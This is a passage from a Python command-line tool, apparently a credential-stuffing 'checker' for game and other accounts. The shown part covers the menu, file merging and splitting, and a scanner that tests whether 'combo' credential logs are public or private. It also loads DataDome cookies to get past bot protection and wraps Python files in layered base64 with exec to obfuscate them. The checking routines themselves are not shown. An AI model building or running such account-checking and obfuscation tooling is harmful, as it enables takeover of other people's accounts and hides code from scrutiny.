    out_dir = Path("Results")
    out_dir.mkdir(exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    merged_file_path = out_dir / f"merged_{timestamp}.txt"

    _log('INFO', 'Merging files...')

    try:
        with open(merged_file_path, 'w', encoding='utf-8') as out_f:
            for fd in file_details:
                with open(fd["path"], 'r', encoding='utf-8', errors='ignore') as in_f:
                    for line in in_f:
                        out_f.write(line)
                        if not line.endswith('\n'):
                            out_f.write('\n')

        final_size = merged_file_path.stat().st_size
        final_size_str = f"{final_size} B"
        for unit in ['B', 'KB', 'MB', 'GB']:
            if final_size < 1024.0:
                final_size_str = f"{final_size:.2f} {unit}"
                break
            final_size /= 1024.0

        current_time = datetime.now().strftime("%I:%M %p")
        current_date = datetime.now().strftime("%Y-%m-%d")

        summary_table = Table(show_header=False, box=box.SIMPLE_HEAVY, border_style="#ffd750")
        summary_table.add_column("Property", style="dim")
        summary_table.add_column("Value", style="bold white")

        summary_table.add_row("Files Merged", str(len(file_details)))
        summary_table.add_row("Merged Size", final_size_str)
        summary_table.add_row("Total Lines", str(total_lines_all))
        summary_table.add_row("Date", current_date)
        summary_table.add_row("Time", current_time)

        summary_panel = Panel(
            summary_table,
            title="[bold green]MERGING COMPLETE[/bold green]",
            subtitle="[dim #ffd750]Powered by: @dvlist[/dim #ffd750]",
            border_style="green",
            expand=False
        )
        print()
        rprint(Padding(summary_panel, (0, 0, 0, 4)))
        _log('SUCCESS', f'Saved to {merged_file_path}')

    except Exception as e:
        _log('ERROR', f'Failed during merge: {e}')

    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')


def high_security_encryption():
    from rich.panel import Panel
    from rich import print as rprint
    from rich.padding import Padding
    from rich import box
    from rich.table import Table
    import os
    import base64
    from datetime import datetime
    from pathlib import Path

    clear_screen()
    display_banner()
    print()

    combo_dir = Path("Combo")
    if not combo_dir.exists():
        combo_dir.mkdir(exist_ok=True)

    py_files = list(combo_dir.glob("*.py"))

    if not py_files:
        _log('ERROR', "No .py files found in 'Combo' folder. Please add your python files there.")
        input(f'\n  {_DIM}↵ menu{_RST} ')
        return

    info_table = Table(box=box.HORIZONTALS, header_style="bold #ffd750", border_style="#ffd750", padding=(0, 2))
    info_table.add_column("#", style="#ffaa00", justify="center")
    info_table.add_column("Filename", style="bold white")
    info_table.add_column("Size", style="white", justify="right")

    for idx, fp in enumerate(py_files, 1):
        size = fp.stat().st_size
        size_str = f"{size} B"
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                size_str = f"{size:.2f} {unit}"
                break
            size /= 1024.0
        info_table.add_row(str(idx), fp.name, size_str)

    panel = Panel(info_table, title="[bold white]PYTHON FILES IN COMBO[/bold white]", box=box.DOUBLE_EDGE, border_style="#ffaa00", expand=False)
    rprint(Padding(panel, (0, 0, 0, 4)))

    while True:
        try:
            prompt_panel = Panel("[white]Enter file number[/white]", title="[#ffd750]❯ Input[/#ffd750]", border_style="#ffd750", box=box.ROUNDED, expand=False)
            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
            choice_idx = int(input("        ❯ ").strip())
            if 1 <= choice_idx <= len(py_files):
                selected_file = py_files[choice_idx - 1]
                break
            _log('ERROR', 'Invalid number — try again.', '    ')
        except ValueError:
            _log('ERROR', 'Enter a valid number.', '    ')

    while True:
        try:
            prompt_panel = Panel("[white]How many layers of Base64 encryption?[/white]", title="[#ffd750]❯ Input[/#ffd750]", border_style="#ffd750", box=box.ROUNDED, expand=False)
            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
            layers = int(input("        ❯ ").strip())
            if layers > 0:
                break
            _log('ERROR', 'Must be greater than 0.', '    ')
        except ValueError:
            _log('ERROR', 'Enter a valid number.', '    ')

    _log('INFO', f"Encrypting {selected_file.name} with {layers} layers...", '    ')

    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        payload = content.encode('utf-8')
        for _ in range(layers):
            payload = base64.b64encode(payload)

        encrypted_content = f"import base64\np = {payload}\nfor _ in range({layers}):\n    p = base64.b64decode(p)\nexec(p.decode('utf-8'))"

        out_dir = Path("Results") / "obf"
        out_dir.mkdir(parents=True, exist_ok=True)

        out_name = selected_file.stem + "-obf.py"
        out_path = out_dir / out_name

        with open(out_path, 'w', encoding='utf-8') as f:
            f.write(encrypted_content)

        final_size = out_path.stat().st_size
        final_size_str = f"{final_size} B"
        for unit in ['B', 'KB', 'MB', 'GB']:
            if final_size < 1024.0:
                final_size_str = f"{final_size:.2f} {unit}"
                break
            final_size /= 1024.0

        line_count = len(encrypted_content.splitlines())
        current_time = datetime.now().strftime("%I:%M %p")
        current_date = datetime.now().strftime("%Y-%m-%d")

        summary_table = Table(show_header=False, box=box.SIMPLE_HEAVY, border_style="#ffd750")
        summary_table.add_column("Property", style="dim")
        summary_table.add_column("Value", style="bold white")

        summary_table.add_row("File Saved", str(out_path))
        summary_table.add_row("New File Size", final_size_str)
        summary_table.add_row("Total Lines", str(line_count))
        summary_table.add_row("Encryption Layer", f"Base64 ({layers} Layers)")
        summary_table.add_row("Date", current_date)
        summary_table.add_row("Time", current_time)

        summary_panel = Panel(
            summary_table,
            title="[bold green]ENCRYPTION COMPLETE[/bold green]",
            subtitle="[dim #ffd750]Powered by: @dvlist[/dim #ffd750]",
            border_style="green",
            expand=False
        )
        print()
        rprint(Padding(summary_panel, (0, 0, 0, 4)))

    except Exception as e:
        _log('ERROR', f'Encryption failed: {e}')

    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')


def detect_watermark():
    from rich.panel import Panel
    from rich import print as rprint
    from rich.padding import Padding
    from rich import box
    import os

    clear_screen()
    display_banner()
    print()

    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()

    if not combo_files:
        _log('ERROR', "No combo files found in 'Combo' folder.")
        input(f'\n  {_DIM}↵ menu{_RST} ')
        return

    file_infos = []
    for file_path in combo_files:
        info = file_manager.get_file_info(file_path)
        if info:
            file_infos.append(info)

    if not file_infos:
        _log('ERROR', 'No valid combo files found.')
        input(f'\n  {_DIM}↵ menu{_RST} ')
        return

    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)

    _log('INFO', f"Scanning {os.path.basename(selected_file)} for watermarks...", '    ')

    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        watermarks = []
        for line in lines:
            line = line.strip()
            lower_line = line.lower()
            if 'http' in lower_line or 't.me' in lower_line or '|' in line or '  ' in line or (line.count(':') != 1 and len(line) > 15):
                if line not in watermarks:
                    watermarks.append(line)
                    if len(watermarks) >= 15:
                        break

        if watermarks:
            result_text = "\n".join(watermarks)
            panel_title = "[bold red]WATERMARKS DETECTED (PUBLIC LOGS)[/bold red]"
            border_color = "red"
        else:
            result_text = "No watermarks detected. Logs appear to be PRIVATE."
            panel_title = "[bold green]NO WATERMARKS DETECTED[/bold green]"
            border_color = "green"

        result_panel = Panel(
            f"[bold white]{result_text}[/bold white]",
            title=panel_title,
            border_style=border_color,
            box=box.DOUBLE_EDGE,
            expand=False
        )
        print()
        rprint(Padding(result_panel, (0, 0, 0, 4)))

    except Exception as e:
        _log('ERROR', f'Failed to scan file: {e}')

    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')

def main():
    cookie_manager = CookieManager()
    n_cookies = len(cookie_manager.live_cookies)
    display_banner()
    if n_cookies > 0:
        _log('SUCCESS', f'Fresh cookies loaded: {n_cookies:,} — unli mode active')
    else:
        _log('WARNING', 'No fresh_cookie.txt — will auto-fetch DataDome cookies on demand')
    print()
    time.sleep(0.5)

    while True:
        clear_screen()
        display_banner()
        choice = display_main_menu()
        if choice == '1':
            bulk_check(bulk_mode='full')
        elif choice == '2':
            bulk_check(bulk_mode='semi')
        elif choice == '3':
            bulk_check(bulk_mode='none')
        elif choice == '4':
            single_check()
        elif choice == '6':
            file_splitter()
        elif choice == '7':
            file_merger()
        elif choice == '8':
            detect_watermark()
        elif choice == '9':
            high_security_encryption()
        elif choice == '10':
            generate_cn31()
        elif choice == '11':
            generate_codm()
        elif choice == '12':
            generate_mlbb()
        elif choice == '5':
            print(f'\n  {_YL}⚠  Tool under construction.{_RST}')
            input(f'\n  {_DIM}↵ menu{_RST} ')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n  {_YL}⚠  Script terminated by user.{_RST}\n')
    except Exception as e:
        import traceback
        error_msg = str(e)
        print(f'\n  {_RD}✖  Unexpected error: {error_msg}{_RST}')
        traceback.print_exc()
        try:
            with open('error_log.txt', 'a', encoding='utf-8') as f:
                f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]: {error_msg}\n')
                f.write(traceback.format_exc())
                f.write('\n' + '-'*60 + '\n')
        except Exception:
            pass